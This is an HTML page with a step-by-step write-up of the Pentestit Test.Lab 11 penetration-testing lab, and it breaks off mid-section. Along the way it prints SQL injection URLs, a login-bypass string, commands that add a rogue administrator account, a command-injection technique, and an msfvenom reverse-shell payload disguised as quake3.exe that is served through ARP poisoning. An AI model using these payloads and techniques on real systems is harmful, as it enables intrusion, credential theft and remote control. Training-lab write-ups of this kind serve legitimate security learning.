<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Pentest-laboratory "Pentestit Test lab v.11" - full passage</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="On June 30, Pentestit's Pentest Laboratory re-launched. For many years, these laboratories have provided an opportunity to test themselves in the role...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Pentest-laboratory "Pentestit Test lab v.11" - full passage</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/web/41f/efa/d05/41fefad05c6c4b3cba553e30ffe04ec8.jpg" width="100%"><br><br>  On June 30, <a href="https://lab.pentestit.ru/pentestlabs/7">Pentestit's Pentest Laboratory</a> re-launched.  For many years, these laboratories have provided an opportunity to test themselves in the role of a pentester in a virtual company with their business processes, servers, employees and problems, learn and test modern vulnerabilities and hone their skills in application auditing and pentest, as close as possible to real. <br><br>  This laboratory is already the 11th in a row.  Descriptions of the <a href="https://habrahabr.ru/company/pentestit/blog/317322/">tenth</a> , <a href="https://habrahabr.ru/company/pentestit/blog/303700/">ninth</a> , <a href="https://lab.pentestit.ru/docs/TL8_WU_ru.pdf">eighth</a> , <a href="https://habrahabr.ru/company/pentestit/blog/257675/">seventh,</a> and <a href="http://nightsite.biz/blog/13883-testlab-v6-laboratoriya-na-shag-vperedi-na-positive-hack-days-2014.html">sixth</a> laboratories are also available, and may be useful in preparing for participation, if you have not already done so. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Like last time, after 11 days, the laboratory was passed by the first participants who collected 12 tokens, which confirm the complete solution of the next task, be it access to the database, penetration and elevation of privileges on the Linux server, or successful execution of the MiTM attack on the director‚Äôs laptop virtual company Test.Lab. <br><br>  This article describes all the stages of the Pentest lab Test.Lab 11 for all those who are interested in immersing themselves in the field of pentest or find out how a particular problem was solved. <br><a name="habracut"></a><br><div class="spoiler">  <b class="spoiler_title">Disclaimer</b> <div class="spoiler_text">  I am not an employee or affiliate of Pentestit.  This document describes the steps I took to solve the tasks in the laboratory.  My personal recommendations and preferences do not in any way relate to the official opinion of Pentestit. <br><br>  All information in this document is provided for educational purposes only.  By continuing to read this document, you agree not to use this information for illegal purposes, and acknowledge that you and you alone are solely responsible for your actions or knowledge gained from this document.  The author of this document and Pentestit will not be liable for any damage caused to anyone as a result of using the knowledge and methods gained from reading this document. <br></div></div><br><h2>  Connect to the lab </h2><br>  Before you begin, you need to register with the lab, set up a VPN connection and connect to the virtual network of Test.Lab. <br><br>  Register <a href="https://lab.pentestit.ru/pentestlabs/7">here</a> , and then follow <a href="https://lab.pentestit.ru/how-to-connect">these instructions</a> in order to connect. <br><br>  For testing, you can install in the <a href="https://www.kali.org/">Kali Linux</a> virtual machine - a special Linux distribution for pentesters, which has everything you need to work.  If you haven't done it yet, now is the time. <br><br><h1>  We start testing </h1><br>  After connecting, two gateways become available to us - 192.168.101.10 and 192.168.101.11, behind which the following network is hidden: <br><img src="https://habrastorage.org/web/614/8dc/d31/6148dcd31b5249be822a4c98fee38797.png" width="100%"><br><br><h1>  We collect information </h1><br>  Taking into account the fact that this time there is no legend about any fictitious company name, passive collection of information from open sources is unlikely to help - a search on ‚Äútest.lab‚Äù will give a lot of excess.  Therefore, we turn to port scanning: <br><br><img src="https://habrastorage.org/web/a0b/b5c/419/a0bb5c4199954a1990d98700d53ebbed.png" width="100%"><br><br>  From the results it is clear that we have two sites available (the main site of the company and CRM, as it turns out later), email services (access to webmail and SMTP) and SSH on non-standard port 2222. If you scan all ports using the -p- key, You can also find OpenVPN on port 1194 of the host 192.168.101.10. <br><br>  It will also be useful to scan UDP ports, however, we will start analyzing the services available to us one by one. <br><br>  At the beginning of pentest you should try to determine the most realistic goals for the upcoming attack.  So, you can immediately cut off the SSH server, which requires authentication by key and an OpenVPN server, waiting for the configuration file to connect (although options for OpenVPN are possible, in the absence of other vulnerabilities).  In addition, you can try to find passwords for employee accounts on mail servers, but you need to know the names of these records or emails of employees. <br><br>  After a cursory analysis of the company's website available on port 80, it becomes clear that it is protected using a web application firewall, since most of the "aggressive" requests earn our IP firewall ban for 2 minutes.  Busting directories, or actively scanning with utilities like Burp Suite, leads to constant 403 errors. <br><br><img src="https://habrastorage.org/web/44c/a4e/9b8/44ca4e9b878849b0b58aa2d0037a92a0.png" width="100%"><br><br>  We focus on the CRM system Vtiger, which, at first glance, is the very low-hanging fruit we are looking for. <br><br><img src="https://habrastorage.org/web/8e6/b47/107/8e6b471074e844f489dcfdcdaf12282a.png" width="100%"><br><br>  At first glance, the Vtiger system is not protected by WAF, and at the same time, version 6.3.0 contains a vulnerability that allows us to get a shell on this server: <br><br><img src="https://habrastorage.org/web/80a/2b5/0ef/80a2b50ef42145b4b43679ca5643b3e3.png" width="100%"><br><br>  But, unfortunately, not everything is so fast - as we see, you first need to log in to CRM, since the vulnerability is <i>authenticated</i> RCE.  We study it more closely! <br><br>
<h1>  Learning <code>CRM</code> </h1><br>  Having found nothing interesting in the subdirectories, and installing a copy of Vtiger 6.3.0 (which can be downloaded <a href="https://sourceforge.net/projects/vtigercrm/files/vtiger%2520CRM%25206.3.0/">here</a> ), we understand that the default username is admin.  Let's try to use Burp Suite to pick up a password. <br><br>  In this article, less attention will be paid to setting up tools like Kali and Burp Suite, and more - to the specifics of specific tasks in the laboratory.  A review of the tools is beyond the scope of this article, but there are a lot of details about this on the web. <br><br>  Having set up Burp Suite to search the password using the large dictionary from SecLists (100 thousand passwords), with the user admin, we get the required password: <br><br><img src="https://habrastorage.org/web/440/cd1/1cc/440cd11cca7d4263bae222f93720cc20.jpg" width="100%"><br><br>  And finally, go to the system: <br><br><img src="https://habrastorage.org/web/d5c/2f6/8c2/d5c2f68c2cda4ed78ff80194d9c53ddc.png"><br><br>  Judging by the password and administrator's nickname in CRM (pay attention to it in the upper right corner - it will still come in handy when taking mail), it becomes clear that the administrator is a serious Star Wars fan. <br><br>  We use the above <a href="https://www.exploit-db.com/exploits/38345/">vulnerability</a> to load the shell after authentication.  To do this, go to <b>CRM Settings ‚Üí Templates ‚Üí Company Details</b> , and edit the logo, changing it to a <a href="http://www.grobinson.me/single-line-php-script-to-gain-shell/">single-line shell</a> , first enabling traffic interception in Burp Suite: <br><br><img src="https://habrastorage.org/web/e59/de9/30d/e59de930d32549cbbf78e87860780a8d.png" width="100%"><br><br>  Having intercepted the request in Burp, we return the php extension to the downloaded file (the alternative would be to immediately download the PHP file, but at the same time change the mime type of the loaded object to image / jpeg in Burp Suite).  Separately, it should be noted that it is necessary to remove the occurrences of the string ‚Äúphp‚Äù in the loaded shell, otherwise Vtiger CRM will filter out such an ‚Äúimage‚Äù (we need &lt;?): <br><br><img src="https://habrastorage.org/web/497/361/af3/497361af3c604b4e90983258cfebbc8b.png" width="100%"><br><br>  Now you can walk around the server looking for a token using our shell: <br><br><img src="https://habrastorage.org/web/fed/e8b/98b/fede8b98b54c4e48ac99db9c50d3dba9.png" width="100%"><br><br>  Done!  The first token is taken. <br><br><h1>  We make our way inside the network </h1><br>  As we remember, after taking CRM, it became clear that the administrator, with email admin@test.lab - a fan of Star Wars.  Let's try to log in as admin@test.lab using the nickname of the administrator from CRM as a password: <br><br><img src="https://habrastorage.org/web/24c/a27/89e/24ca2789e1044dfa95ce3181ac53a733.png" width="100%"><br><br>  Found SSH-key for user tech: <br><br><img src="https://habrastorage.org/web/55e/8b5/694/55e8b56941dc4b218643896d5a4da8c6.png" width="100%"><br><br>  With this key you can connect to the SSH server: <br><br><img src="https://habrastorage.org/web/350/1f7/b7f/3501f7b7fbaf4660be9fcf0fb34f573f.png" width="100%"><br><br>  And thus, we find ourselves inside the network of a branch office.  Having connected to a new server, it is useful to study it from all sides in order to understand what information is available for further promotion within the network or elevation of privileges.  A good checklist of what must be checked can be found <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">here</a> . <br><br>  Having studied, in particular, crontab, we find out that there is a connection to OpenVPN.  Despite the fact that the scripts themselves are not accessible to us in the / opt folder, something useful can still be extracted: <br><br><img src="https://habrastorage.org/web/dd8/709/ed5/dd8709ed5e83495095e488a3dc95a330.png"><br><br>  Thus, we will know the user name of Office-2, and the certificate necessary for the connection.  Having compiled the necessary configuration file (below) on the basis of this data, we will use the <a href="https://github.com/galkan/tools/tree/master/openvpn-brute">script to iterate over the passwords to OpenVPN</a> .  The script will have to be changed a bit so that the external OpenVPN does not turn off on every attempt. <br><br><pre> <code class="bash hljs">client dev tun proto tcp remote 192.168.101.10 1194 auth-user-pass resolv-retry infinite persist-key persist-tun comp-lzo verb 3 &lt;ca&gt; -----BEGIN CERTIFICATE----- MIIEXjCCA0agAwIBAgIJAKYiQCcisQFFMA0GCSqGSIb3DQEBCwUAMHwxCzAJBgNV BAYTAlJVMQ8wDQYDVQQIEwZNb3Njb3cxDzANBgNVBAcTBk1vc2NvdzERMA8GA1UE ChMIQ29tYXBhbnkxCzAJBgNVBAsTAklUMRkwFwYDVQQDExBjb21wYW55LnRlc3Qu bGFiMRAwDgYDVQQpEwdFYXN5UlNBMB4XDTE3MDQwMjE0NDIzMFoXDTI3MDMzMTE0 NDIzMFowfDELMAkGA1UEBhMCUlUxDzANBgNVBAgTBk1vc2NvdzEPMA0GA1UEBxMG TW9zY293MREwDwYDVQQKEwhDb21hcGFueTELMAkGA1UECxMCSVQxGTAXBgNVBAMT EGNvbXBhbnkudGVzdC5sYWIxEDAOBgNVBCkTB0Vhc3lSU0EwggEiMA0GCSqGSIb3 DQEBAQUAA4IBDwAwggEKAoIBAQDdcIqS/FA1M8NhiFfiQFKdxUMePwHK2UgmshXS 48Jeshl7qjHAfLQl2Pex83gbNWud9av4yp1H4m3iwGaqTQPaxgOmzoV6vMN3Hnt7 Vk9eqTpGaODFC6IrSrnE9bYL7E90ra0PWHZY9dshup/L+uasg7OrUHHQhXV6e5GR C0jAmqUp8Wj61DZDuyvkQE8nDUUdxEObUgdZF5dq4aHKkBFL1iC3+f+aSA6//QTM kNYzrGv2s0cpkZI8zV4ZT+YgXgWMBJfszIU1AFegNLfksgpyR+IP3YjjkQ4s6wQd HBTkWsLSf4zusgTYkHpG3mP0z4o7/r4RiEywrJidgE5cN2wbAgMBAAGjgeIwgd8w HQYDVR0OBBYEFONOp29lTyyDD8E1wzF+rOl1LAlcMIGvBgNVHSMEgacwgaSAFONO p29lTyyDD8E1wzF+rOl1LAlcoYGApH4wfDELMAkGA1UEBhMCUlUxDzANBgNVBAgT Bk1vc2NvdzEPMA0GA1UEBxMGTW9zY293MREwDwYDVQQKEwhDb21hcGFueTELMAkG A1UECxMCSVQxGTAXBgNVBAMTEGNvbXBhbnkudGVzdC5sYWIxEDAOBgNVBCkTB0Vh c3lSU0GCCQCmIkAnIrEBRTAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IB AQBYVZ+3ZjvMjOjOk8zgmMWHaf153ptbFf53c1YtxmDFKWbDo7mG0JmN318T+Kh/ /fxNOha1a2WdQ97yPCR8llz08ZIWLm2n38JdhWCuSZPsozYIGOQX1rZ4lj+8T0kb hF1vr0KOCI6ODTwPEPJwAd9mcdRQK0Jd52WvuvdGQKUC8DPPDo4B2VHAn8KIDIJp b+mecHvvxGTSzo4k5nz4bdpYit9i9HayvJ3uIjt05jciQkp5bi5YUXEpq0cspNLr awoYzU/p/oTvFG8sn8EWAl6pPonQUCGka7GRG2Q9Na9QysMG8H5hITZ7d5VngyrJ vwj14awsaPvMoIgk8C8Zrkuu -----END CERTIFICATE----- &lt;/ca&gt;</code> </pre><br>  We select a password using a small dictionary based on starwars (after all, the administrator is a fan, as we already understood): <br><br><img src="https://habrastorage.org/web/1e6/9f6/e84/1e69f6e8461e49868c6876c6bf55fd65.png" width="100%"><br><br>  And then we successfully connect to the internal VPN, after which we can see the subnet 172.16.0.0/24 displayed on the network diagram above. <br><br><h1>  We attack SITE </h1><br>  After gaining access to the internal network, and scanning with nmap, we find on 172.16.0.11:80 the same site that was accessible from the outside, now without WAF protection.  After a little study of the source code of the page, it becomes clear that we have Wordpress version 4.8, which immediately catches the eye of the kittycatfish plugin, <a href="https://www.exploit-db.com/exploits/41919/">vulnerable</a> to SQL injection, at /wp-content/plugins/kittycatfish-2.2/. <br><br><img src="https://habrastorage.org/web/fa9/d19/8f5/fa9d198f5c3e4246b0ef0f72c1c64403.png" width="100%"><br><br>  The description of the exploit indicates that the Injection is located in the base.css.php file, in the kc_ad parameter.  Let's look for it on <a href="https://github.com/wp-plugins/kittycatfish/blob/5e00612c44ab8e30eeb26aa47adc8405bff7a771/base.css.php">GitHub</a> : <br><br><pre> <code class="php hljs">$kc_ad = $_GET[<span class="hljs-string"><span class="hljs-string">'kc_ad'</span></span>]; $kc_ad_meta = kittycatfish_ad_get_meta($kc_ad);</code> </pre><br>  After studying kittycatfish.php, it becomes clear that the value of kc_ad_css is added to CSS, and, accordingly, the injection may look like this: <br><br><pre> <code class="sql hljs"> http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>+<span class="hljs-number"><span class="hljs-number">0x6b635f61645f637373</span></span>,(<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span>@@<span class="hljs-keyword"><span class="hljs-keyword">version</span></span>)</code> </pre><br><img src="https://habrastorage.org/web/1cb/794/859/1cb794859cd24854a6654902a5b46321.png" width="100%"><br><br>  Version received.  Now we get the name of the table: <br><br><pre> <code class="sql hljs">http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>+<span class="hljs-number"><span class="hljs-number">0x6b635f61645f637373</span></span>,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">GROUP_CONCAT</span></span>(table_name)%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span>information_schema.tables%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span>table_schema=<span class="hljs-keyword"><span class="hljs-keyword">database</span></span>()%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">GROUP</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">BY</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span>table_name%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">LIMIT</span></span>%<span class="hljs-number"><span class="hljs-number">200</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre><br>  And finally the token in the column name: <br><br><pre> <code class="sql hljs">http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>+<span class="hljs-number"><span class="hljs-number">0x6b635f61645f637373</span></span>,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">GROUP_CONCAT</span></span>(column_name)%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span>information_schema.columns%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span>table_name=<span class="hljs-number"><span class="hljs-number">0x746c5f746f6b656e</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">GROUP</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">BY</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span>table_name%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-keyword"><span class="hljs-keyword">LIMIT</span></span>%<span class="hljs-number"><span class="hljs-number">200</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre><br><img src="https://habrastorage.org/web/bac/7f6/abb/bac7f6abbe49439da5bbe386fb31b8cb.png" width="100%"><br><br>  Done!  By the way, all hex values ‚Äã‚Äãare obtained by the following commands: <br><br><pre> <code class="bash hljs">$ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> -n kc_ad_css | xxd -p 6b635f61645f637373 $ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> -n tl_token | xxd -p 746c5f746f6b656e</code> </pre><br><h1>  RDP Token </h1><br>  Let's return for a while to the network of the branch ‚ÄúThe Second Office‚Äù, which became available to us thanks to the connection to SSH: computers 192.168.13.1-3, and scan the available ports (since they do not respond to ping, you need to use the -Pn switch): <br><br><img src="https://habrastorage.org/web/74d/971/91c/74d97191c3f64767a0c911bb1dd672e3.png"><br><br>  Having found RDP, we will try to connect to it, having previously forwarded the necessary port, using ~ C - the command console of the SSH client: <br><br><img src="https://habrastorage.org/web/cb1/472/04a/cb147204a96643588bd39302fcf22109.png"><br><br>  In Remote Desktop there is such a feature that allows you to find out the list of users on your computer, if you do not transfer any user name when connecting.  We do this using xfreerdp: <br><br><pre> <code class="bash hljs">xfreerdp /v:127.0.0.1 -sec-nla /u:<span class="hljs-string"><span class="hljs-string">""</span></span></code> </pre><br><img src="https://habrastorage.org/web/a9d/5aa/ffc/a9d5aaffc9ba49e9855d1c2b670c9e94.png" width="100%"><br><br>  After receiving usernames, we will use <a href="https://github.com/galkan/crowbar">crowbar</a> to find the password - for RDP, in my experience, it always works better than Hydra or Medusa: <br><br><img src="https://habrastorage.org/web/458/3b3/6fb/4583b36fb2854e27a5f866f49e144dda.png"><br><br>  After successfully selecting a password, we get to RDP: <br><br><img src="https://habrastorage.org/web/aad/412/2f4/aad4122f4261413aae47eeded1370ac2.png" width="100%"><br><br>  Having not found anything interesting for the user arm554 we are moving on.  Let's try to elevate privileges using <a href="https://www.exploit-db.com/exploits/39719/">ms16_032</a> , as described, for example, in this <a href="https://www.youtube.com/watch%3Fv%3DcZzkTZklba8">video</a> : <br><br><pre> <code class="bash hljs">xfreerdp /v:127.0.0.1 /u:<span class="hljs-string"><span class="hljs-string">"arm554"</span></span> /drive:share,/root/pentestit</code> </pre><br>  Copying MS16-032.ps1 from Exploit DB, we get administrator rights: <br><br><img src="https://habrastorage.org/web/efd/f4c/3d5/efdf4c3d5f1f48f39171e51fd2615da2.png" width="100%"><br><br>  After that, using the following commands we create a new administrative user: <br><br><pre> <code class="bash hljs">net user user1 &lt;your_password&gt; /add net localgroup administrators user1 /add</code> </pre><br>  By logging in as user1, we get access to the user folder, in which the token can be found, and at the same time, and apparently, the user password hashes armXYZ, from which it is not deleted, judging by the files, only arm554. <br><br><img src="https://habrastorage.org/web/14e/fb1/dbb/14efb1dbb82f4071a217ff16e4ff00b4.png" width="100%"><br><br>  This information is useful to us in the future, for taking AD, to which we proceed. <br><br>  In addition to the machine 192.168.13.1, in the branch office you can find suitable passwords for the users ‚Äúuser‚Äù on the machines 192.168.13.2 and 192.168.13.3 using a dictionary larger than john.txt. <br><br><h1>  Pass-the-hash in AD </h1><br>  After receiving the RDP and extracting the hash, we get the opportunity to attack Active Directory, which, according to the network diagram, is located at 172.16.0.10.  Port scanning only confirms that it is a domain controller (and at the same time its name is TEST.LAB): <br><br><img src="https://habrastorage.org/web/485/bd7/483/485bd7483fc842ba847608c4b1dd4b91.png" width="100%"><br><br>  We will use the kerberos_enumusers module from Metasploit to confirm the existence of arm554 using Kerberos: <br><br><img src="https://habrastorage.org/web/7bf/6c6/7e9/7bf6c67e940948088f683ab524b2680b.png" width="100%"><br><br>  Taking into account the fact that Windows 2012 is installed, we will try to perform pass-the-hash via SMBv3: <br><br><img src="https://habrastorage.org/web/e72/e9e/7f2/e72e9e7f2f204f4d87683b2da5568a34.png"><br><br>  After getting the list of available shares, let's try to access files: <br><br><img src="https://habrastorage.org/web/b88/fa5/3a0/b88fa53a012049ad87718e83e95bce9b.png"><br><br>  The token is received, and the network_test.txt file with the following contents: <br><br><pre> <code class="bash hljs">Hi, mate! Need to <span class="hljs-built_in"><span class="hljs-built_in">test</span></span> ARP-table <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> DIR subnet. I<span class="hljs-string"><span class="hljs-string">'ll install intercepter &lt;       DIR&gt;</span></span></code> </pre><br>  We still do not have access to this server, since we first need to gain access to the router 172.168.0.252 indicated on the network diagram.  Therefore, we continue to explore the subnet 172.16.0.0/24. <br><br><h1>  CUPS Token </h1><br>  On the 80th port of the machine 172.16.0.14, displayed on the network diagram as CUPS, we find the following page: <br><br><img src="https://habrastorage.org/web/a7f/097/427/a7f097427d2b4879b7471d838a99b4b6.png" width="100%"><br><br>  The administrative panel leads to the address closed by basic-authentication, while local storage displays a self-written web application with a login form.  Having tried several base passwords, we assume the presence of a SQL injection, and enter the system with such data: <br><br><pre> <code class="bash hljs">admin admin<span class="hljs-string"><span class="hljs-string">' or 1=1 -- -</span></span></code> </pre><br>  After that, scans made in the system become available to us.  Among other things, we find a private key to connect to the router, hiding from us the last part of the network: <br><br><img src="https://habrastorage.org/web/1b1/b80/942/1b1b8094237442779b170e5094915b9a.png" width="100%"><br><br>  Having spent an impressive amount of time to disassemble each character and correctly re-type it from the image, you can connect to the router named morgan: <br><br><img src="https://habrastorage.org/web/c72/33f/660/c7233f6604f8463a80218d6759769832.png" width="100%"><br><br>  We use sshuttle for convenient port forwarding on the 192.168.10.0/24, 192.168.11.0/24 and 192.168.12.0/24 subnets: <br><br><img src="https://habrastorage.org/web/9e6/378/a74/9e6378a748e340a48b71b3b8437bdeae.png" width="100%"><br><br><h1>  Man-in-the-middle in DIR - get access to the computer DIRECTOR </h1><br>  Having scanned the DIR network and using the login and password found on AD, we connect to 192.168.12.2 via RDP and find the Intercepter in the Soft folder, as mentioned in the information from the domain controller: <br><br><img src="https://habrastorage.org/web/979/2ef/781/9792ef781e7f4c75beec1fea010fc67c.png" width="100%"><br><br>  To begin with, let's try to do ARP poisoning inside the subnet and see if 192.168.12.1 (director's machine) and 192.168.12.3 (machine with a web server on port 80) communicate with each other.  To do this, scan the network: <br><br><img src="https://habrastorage.org/web/a3d/a73/593/a3da735930a6453cbe608c1bbd7fd03c.png" width="100%"><br><br>  After the necessary machines are found, perform the settings as shown in the screenshot: <br><br><img src="https://habrastorage.org/web/f8f/4a4/9a3/f8f4a49a36834969aae6bedff080b4c1.png" width="100%"><br><br>  In this case, despite the fact that 192.168.12.3 is not a gateway, we set it as the gateway, because we are not interested in the communications of the director‚Äôs machine with the external network, but in the communication within this subnet.  Intercepter-NG will respond to the machine 192.168.12.1 that it is 12.3, and to the machine 12.3, that it is 12.1.  After this setting, go to the raw packets tab, and set the ‚Äúport not 3389‚Äù Pcap filter to exclude RDP packets that we constantly exchange with the 12.2 machine: <br><br><img src="https://habrastorage.org/web/3b3/1a8/3a7/3b31a83a7f85476e88b27f19ce617b57.png" width="100%"><br><br>  After that, you need to run sniffing, NAT and ARP poisoning to launch an attack: <br><br><img src="https://habrastorage.org/web/618/9bf/9af/6189bf9afc494d6fbddd08c05b3f9452.png" width="100%"><br><br>  Soon we see that the director is trying to download quake3.exe from the web server <a href="http://192.168.12.3/">192.168.12.3</a> , but receives an error 404. <br><br><img src="https://habrastorage.org/web/cfd/77e/882/cfd77e882d434f41a4c8ad8d5f6bd8c4.png" width="100%"><br>  Fix this annoying situation by generating a reverse shell payload using the following command: <br><br><pre> <code class="bash hljs">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.12.2 LPORT=80 -f exe &gt; quake3.exe</code> </pre><br>  After the file is uploaded to the RDP server, we will configure the implementation of this file in the HTTP response.  To do this, we enable the SSL Strip (although the file is not downloaded over SSL, it is necessary to enable MiTM in the Intercepter): <br><br><img src="https://habrastorage.org/web/550/8f1/201/5508f12013bf4390a8ed253f1f4d2cd9.png" width="100%"><br><br>  Then we set up the deployment by selecting the fake quake3.exe we downloaded: <br><br><img src="https://habrastorage.org/web/464/a67/c32/464a67c32b104aff8956b7b7e99582a9.png" width="100%"><br><br>  Then we run the netcat listener, and enable it through the firewall: <br><br><img src="https://habrastorage.org/web/3e0/dd7/619/3e0dd761989747a2b6bd0d9d6dbc883f.png" width="100%"><br><br>  And, finally, we enable ARP poisoning again to inject quake3.exe in response from the web server, and we immediately get the shell: <br><br><img src="https://habrastorage.org/web/100/02e/ca8/10002eca85fd4db48538e2c09daed0cf.png" width="100%"><br><br>  In the documents we find the SSH-key, and our next token! <br><br><img src="https://habrastorage.org/web/7f5/68c/b16/7f568cb168e146bd820e3052c133d5da.png" width="100%"><br><br>  In addition, having studied 192.168.12.2 itself, you can find the todo file, which will come in handy later: <br><br><img src="https://habrastorage.org/web/223/d0f/df0/223d0fdf06484204ada94d4ac43b5355.png" width="100%"><br><br>  Thanks to the found key, we can try to access the machine 192.168.11.1, to which we now have access through the router (the key to which was found in CUPS) and the remote key found on the director‚Äôs machine. <br><br><h1>  Switch to ADMIN network </h1><br>  When connecting to 192.168.11.1 using the remote key, we get a form that forwards us to other computers on the network (namely, Srv1 = 172.16.0.16, using the user aengineer and the saved key, or Srv2 = 192.168.10.1, also with use login aengineer). <br><br><img src="https://habrastorage.org/web/a10/198/852/a1019885274942bea1eb5e570a695e3c.png" width="100%"><br><br>  Something suggests that there is a command injection, and we will be able to get out of this script and get on the 11.1 itself.  Let's try to do this using standard command delimiters, such as;, |, &amp;, and others: <br><br><img src="https://habrastorage.org/web/be0/df7/7b9/be0df77b9a394c53b048b71542a7aae7.png" width="100%"><br><br>  Trigger semicolon!  The console freezes for a few seconds if you add sleep.  At the same time, if instead of Srv1 or Srv2 to write something else, we see that we receive messages from STDERR, while the output of commands that are executed successfully is hidden.  Let's try to redirect the standard output to STDERR to get the output of the results: <br><br><img src="https://habrastorage.org/web/41f/1f9/336/41f1f9336aae4238aeb55577a3066cd2.png" width="100%"><br><br>  Works!  Now, using this technique we get a full shell: <br><br><img src="https://habrastorage.org/web/390/3f6/b0e/3903f6b0ed2d46fc884abd31290fc192.png" width="100%"><br><br>  The / opt / gh folder contains a script that requested the server name.  As you can see, it really has a command-injection vulnerability (and at the same time a filter on bash, which we bypassed using dash).  Having studied this server, the only useful information is the aengineer key with which we connected on 172.16.0.16 and 192.168.10.1, which can be copied: <br><br><img src="https://habrastorage.org/web/450/cfd/e9e/450cfde9e834479880adc100c1405479.png" width="100%"><br><br>  Thus, we were able to get into the network admin. <br><br><h1>  We get CONNECT </h1><br>  Having connected to 192.168.10.1 as aengineer, we recall that the file found on 192.168.12.2 mentioned FTP connection to the server on 192.168.10.1 on port 2020. Just in case, let's turn on the netcat listener on this port: <br><br><img src="https://habrastorage.org/web/ce0/a85/968/ce0a8596819a43228a285c9c38eaa9c1.png" width="100%"><br><br>  And we find that the server really receives the connection, but nothing happens further.  Since the FTP connection - it is logical to assume that the connecting party waits for the welcome from the FTP server before logging in.  Let's simulate this with a simple command: <br><br><img src="https://habrastorage.org/web/133/bf6/d3c/133bf6d3c6364d3986daa8b7d0e7d72c.png" width="100%"><br><br>  Token received! <br><br><h1>  Listening to CLOUD </h1><br>  Continuing to be on 192.168.10.1, you can see that it is allowed to do tcpdump on this machine from the user aengineer.  Usually such a configuration requires root privileges, but here it was apparently <a 